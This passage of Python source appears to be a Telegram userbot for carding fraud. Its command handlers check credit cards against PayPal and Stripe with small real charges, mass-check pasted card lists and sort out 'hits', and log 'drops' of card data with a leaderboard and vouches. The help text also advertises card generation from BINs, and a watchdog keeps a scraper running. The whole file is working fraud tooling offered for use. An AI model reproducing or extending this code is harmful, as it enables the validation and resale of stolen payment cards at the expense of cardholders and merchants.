            badge = f"{status} ⚠️"
        bin_info = await get_bin_info_async(m.group(1)[:6])
        details_card = get_card_details(m.group(1), bin_info)
        reply = (f"┏━━━━━━━⍟\n┃ {badge}\n┗━━━━━━━━━━━⊛\n"
                 f"[❃] 𝗖𝗮𝗿𝗱    ➜ `{card_str}`\n[❃] 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➜ PayPal\n"
                 f"[❃] 𝗕𝗿𝗮𝗻𝗱  ➜ {details_card['brand']}\n[❃] 𝗕𝗮𝗻𝗸   ➜ {details_card['bank']}\n"
                 f"[❃] 𝗥𝗲𝘀𝗽    ➜ {detail}")
        await event.edit(reply)

    @client.on(events.NewMessage(outgoing=True, pattern=r"(?i)^/chk1(?:\s+(.+))?"))
    async def chk1_cmd(event):
        match = event.pattern_match
        raw = (match.group(1) or "").strip()
        if not raw or not CARD_RE.search(raw):
            await event.edit("Usage: /chk1 4242424242424242|12|28|123")
            return
        m = CARD_RE.search(raw)
        card_str = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        await event.edit("Charging $1.00 via Stripe...")
        status, detail = await check_card("chg1", card_str, "Stripe $1")
        if status == "CHARGED":
            badge = "CHARGED 💰"
        elif status == "APPROVED":
            badge = "APPROVED 🟢"
        elif status == "DECLINED":
            badge = "DECLINED 🔴"
        else:
            badge = f"{status} ⚠️"
        bin_info = await get_bin_info_async(m.group(1)[:6])
        details_card = get_card_details(m.group(1), bin_info)
        reply = (f"┏━━━━━━━⍟\n┃ {badge}\n┗━━━━━━━━━━━⊛\n"
                 f"[❃] 𝗖𝗮𝗿𝗱    ➜ `{card_str}`\n[❃] 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➜ Stripe $1\n"
                 f"[❃] 𝗕𝗿𝗮𝗻𝗱  ➜ {details_card['brand']}\n[❃] 𝗕𝗮𝗻𝗸   ➜ {details_card['bank']}\n"
                 f"[❃] 𝗥𝗲𝘀𝗽    ➜ {detail}")
        await event.edit(reply)

    @client.on(events.NewMessage(outgoing=True, pattern=r"(?i)^/drop(?:\s+(.+))?"))
    async def drop_cmd(event):
        match = event.pattern_match
        raw = (match.group(1) or "").strip()
        if not raw or not CARD_RE.search(raw):
            await event.edit("Usage: /drop 4111111111111111|12|27|123")
            return
        m = CARD_RE.search(raw)
        card_str = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        me = await client.get_me()
        dropper = f"@{me.username}" if me.username else (me.first_name or "Unknown")
        total = add_drop(dropper, card_str)
        reply = (f"┏━━━━━━━⍟\n┃ DROP 💳\n┗━━━━━━━━━━━⊛\n"
                 f"[❃] 𝗖𝗮𝗿𝗱   ➜ `{card_str}`\n[❃] 𝗗𝗿𝗼𝗽𝗽𝗲𝗿 ➜ {dropper}\n"
                 f"[❃] 𝗧𝗼𝘁𝗮𝗹  ➜ {total} drop(s)")
        await event.edit(reply)

    @client.on(events.NewMessage(outgoing=True, pattern=r"(?i)^/leaderboards?$"))
    async def leaderboard_cmd(event):
        board = get_leaderboard()
        if not board:
            await event.edit("┏━━━━━━━⍟\n┃ LEADERBOARD 🏆\n┗━━━━━━━━━━━⊛\n[❃] No drops yet.")
            return
        medals = ["🥇", "🥈", "🥉"]
        lines = []
        for i, entry in enumerate(board[:10]):
            medal = medals[i] if i < 3 else f"{i+1}."
            lines.append(f"{medal} {entry['name']} — {entry['count']} drop(s)")
        reply = "┏━━━━━━━⍟\n┃ LEADERBOARD 🏆\n┗━━━━━━━━━━━⊛\n" + "\n".join(f"[❃] {line}" for line in lines)
        await event.edit(reply)

    @client.on(events.NewMessage(outgoing=True, pattern=r"(?i)^/vouch(?:\s+(\S+)(?:\s+(.+))?)?$"))
    async def vouch_cmd(event):
        match = event.pattern_match
        for_user = (match.group(1) or "").strip()
        note = (match.group(2) or "").strip()
        if not for_user:
            await event.edit("Usage: /vouch @username [note]")
            return
        me = await client.get_me()
        from_name = f"@{me.username}" if me.username else (me.first_name or "Unknown")
        total = add_vouch(from_name, for_user, note)
        note_line = f"\n[❃] 𝗡𝗼𝘁𝗲    ➜ {note}" if note else ""
        reply = (f"┏━━━━━━━⍟\n┃ VOUCH ✅\n┗━━━━━━━━━━━⊛\n"
                 f"[❃] 𝗩𝗼𝘂𝗰𝗵𝗲𝗱 ➜ {for_user}\n[❃] 𝗕𝘆      ➜ {from_name}{note_line}\n"
                 f"[❃] 𝗧𝗼𝘁𝗮𝗹  ➜ {total} vouch(es) for {for_user}")
        await event.edit(reply)

    @client.on(events.NewMessage(outgoing=True, pattern=r"(?i)^/vouches?(?:\s+(\S+))?$"))
    async def vouches_cmd(event):
        match = event.pattern_match
        target = (match.group(1) or "").strip()
        vouches = get_vouches(target)
        if not vouches:
            label = f"for {target}" if target else "yet"
            await event.edit(f"┏━━━━━━━⍟\n┃ VOUCHES ✅\n┗━━━━━━━━━━━⊛\n[❃] No vouches {label}.")
            return
        title = f"VOUCHES FOR {target.upper()}" if target else "ALL VOUCHES"
        lines = []
        for v in vouches[-15:]:
            note_part = f" — {v['note']}" if v.get("note") else ""
            lines.append(f"{v['from']} ➜ {v['for']}{note_part} ({v['ts']})")
        reply = f"┏━━━━━━━⍟\n┃ {title} ✅\n┗━━━━━━━━━━━⊛\n" + "\n".join(f"[❃] {line}" for line in lines)
        await event.edit(reply)

    @client.on(events.NewMessage(outgoing=True, pattern=r"(?i)^/ban(?:\s+(\S+))?$"))
    async def ban_cmd(event):
        match = event.pattern_match
        target = (match.group(1) or "").strip()
        if not target:
            await event.edit("Usage: /ban @username")
            return
        if ban_user(target):
            await event.edit(f"┏━━━━━━━⍟\n┃ BANNED 🚫\n┗━━━━━━━━━━━⊛\n[❃] 𝗨𝘀𝗲𝗿  ➜ {target}\n[❃] 𝗦𝘁𝗮𝘁𝘂𝘀 ➜ Banned")
        else:
            await event.edit(f"{target} is already banned.")

    @client.on(events.NewMessage(outgoing=True, pattern=r"(?i)^/unban(?:\s+(\S+))?$"))
    async def unban_cmd(event):
        match = event.pattern_match
        target = (match.group(1) or "").strip()
        if not target:
            await event.edit("Usage: /unban @username")
            return
        if unban_user(target):
            await event.edit(f"┏━━━━━━━⍟\n┃ UNBANNED ✅\n┗━━━━━━━━━━━⊛\n[❃] 𝗨𝘀𝗲𝗿  ➜ {target}\n[❃] 𝗦𝘁𝗮𝘁𝘂𝘀 ➜ Unbanned")
        else:
            await event.edit(f"{target} is not in the ban list.")

    @client.on(events.NewMessage(outgoing=True, pattern=r"(?i)^/banlist$"))
    async def banlist_cmd(event):
        banned = get_banned()
        if not banned:
            await event.edit("┏━━━━━━━⍟\n┃ BAN LIST 🚫\n┗━━━━━━━━━━━⊛\n[❃] No banned users.")
            return
        lines = "\n".join(f"[❃] @{u}" for u in banned)
        await event.edit(f"┏━━━━━━━⍟\n┃ BAN LIST 🚫 ({len(banned)})\n┗━━━━━━━━━━━⊛\n{lines}")

    @client.on(events.NewMessage(outgoing=True, pattern=r"(?i)^/mass(?:\s+(.+))?"))
    async def mass_cmd(event):
        raw = (event.pattern_match.group(1) or "").strip()
        card_text = raw
        if event.is_reply:
            replied = await event.get_reply_message()
            if replied and replied.raw_text:
                card_text = (raw + "\n" + replied.raw_text).strip()
        if not card_text:
            await event.edit("Usage: /mass pp or /mass chg1 (reply to card list)")
            return
        first_token = card_text.split()[0].lower()
        if first_token not in ("pp", "paypal", "chg1", "charge1"):
            await event.edit("Specify gateway: pp (PayPal) or chg1 (Stripe $1)")
            return
        if first_token in ("pp", "paypal"):
            gateway, gateway_label = "pp", "PayPal"
        else:
            gateway, gateway_label = "chg1", "Stripe $1"
        card_text = card_text[len(first_token):].strip()
        cards = [f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}" for m in CARD_RE.finditer(card_text)]
        if not cards:
            await event.edit("No valid cards found.")
            return
        total = len(cards)
        hits, dead, errors = [], [], []
        await event.edit(f"Mass checking {total} card(s) via {gateway_label}...\n0/{total}")
        loop = asyncio.get_event_loop()
        for i, card_str in enumerate(cards, 1):
            try:
                status, detail = await check_card(gateway, card_str, gateway_label)
                if status in ("CHARGED", "APPROVED"):
                    hits.append(f"✅ {card_str} - {detail[:50]}")
                elif status == "DECLINED":
                    dead.append(card_str)
                else:
                    errors.append(f"⚠️ {card_str} - {detail[:40]}")
            except Exception as e:
                errors.append(f"⚠️ {card_str} - {str(e)[:40]}")
            if i % 3 == 0 or i == total:
                try:
                    await event.edit(f"Mass via {gateway_label}... {i}/{total}\nHits: {len(hits)}\nDead: {len(dead)}")
                except:
                    pass
                await asyncio.sleep(0.5)
        hit_block = ("\n" + "\n".join(hits)) if hits else " None"
        err_block = ("\n" + "\n".join(errors)) if errors else ""
        summary = (f"┏━━━━━━━⍟\n┃ MASS CHECK 📊\n┗━━━━━━━━━━━⊛\n"
                   f"[❃] 𝗚𝗮𝘁𝗲𝘄𝗮𝘆  ➜ {gateway_label}\n[❃] 𝗧𝗼𝘁𝗮𝗹   ➜ {total}\n"
                   f"[❃] 𝗛𝗶𝘁𝘀    ➜ {len(hits)}\n[❃] 𝗗𝗲𝗮𝗱    ➜ {len(dead)}\n"
                   f"[❃] 𝗘𝗿𝗿𝗼𝗿𝘀  ➜ {len(errors)}\n\n🟢 Hits:{hit_block}")
        if err_block:
            summary += f"\n\n{err_block}"
        await event.edit(summary)

    @client.on(events.NewMessage(outgoing=True, pattern=r"(?i)^/stats$"))
    async def stats_cmd(event):
        s = get_stats()
        forwarded = s.get("forwarded", 0)
        charged = s.get("charged", 0)
        declined = s.get("declined", 0)
        errors = s.get("errors", 0)
        since = s.get("since", "N/A")
        rate = f"{(charged / forwarded * 100):.1f}%" if forwarded > 0 else "0.0%"
        reply = (f"┏━━━━━━━⍟\n┃ BOT STATS 📊 ({BOT_USERNAME})\n┗━━━━━━━━━━━⊛\n"
                 f"[❃] 𝗙𝗼𝗿𝘄𝗮𝗿𝗱𝗲𝗱 ➜ {forwarded}\n"
                 f"[❃] 💰 𝗖𝗵𝗮𝗿𝗴𝗲𝗱  ➜ {charged}\n"
                 f"[❃] 🔴 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ➜ {declined}\n"
                 f"[❃] ⚠️ 𝗘𝗿𝗿𝗼𝗿𝘀   ➜ {errors}\n"
                 f"[❃] 📈 𝗛𝗶𝘁 𝗥𝗮𝘁𝗲  ➜ {rate}\n"
                 f"[❃] 🕒 𝗧𝗿𝗮𝗰𝗸𝗶𝗻𝗴 ➜ Since {since}")
        await event.edit(reply)

    @client.on(events.NewMessage(outgoing=True, pattern=r"(?i)^/help$"))
    async def help_cmd(event):
        help_text = (
            f"┏━━━━━━━⍟\n┃ {BOT_USERNAME}'S COMMANDS 📚\n┗━━━━━━━━━━━⊛\n\n"
            f"🔹 CARD GENERATION\n"
            f"  /gen <BIN> - Generate valid card\n"
            f"  /bin <BIN> - Lookup BIN via API\n"
            f"  /binlist <BIN> - Local BIN DB\n\n"
            f"🔹 CARD CHECKERS\n"
            f"  /chkpp <CC|MM|YY|CVV> - PayPal (real)\n"
            f"  /chk1 <CC|MM|YY|CVV> - Stripe ($1 real charge + refund)\n\n"
            f"🔹 BULK\n"
            f"  /mass <pp|chg1> - Reply to card list\n\n"
            f"🔹 SOCIAL\n"
            f"  /drop <card>\n"
            f"  /leaderboard\n"
            f"  /vouch @user [note]\n"
            f"  /vouches [@user]\n\n"
            f"🔹 MODERATION\n"
            f"  /ban @user\n"
            f"  /unban @user\n"
            f"  /banlist\n\n"
            f"🔹 INFO\n"
            f"  /stats\n\n"
            f"Format: CC|MM|YY|CVV\n"
            f"Example: /chk1 4111111111111111|12|27|123\n\n"
            f"Bot by {BOT_USERNAME}")
        await event.edit(help_text)

    await client.run_until_disconnected()

async def watchdog():
    if RUN_MODE in ("both", "web"):
        t = Thread(target=run_flask, daemon=True)
        t.start()
        print(f"Flask server on port {PORT}")
    if RUN_MODE in ("both", "scraper"):
        while True:
            try:
                await run_scraper()
            except Exception as e:
                logger.error(f"Scraper crashed: {e}")
                print(f"Error: {e}")
                await asyncio.sleep(30)

if __name__ == "__main__":
    if RUN_MODE == "web":
        run_flask()
    else:
        asyncio.run(watchdog())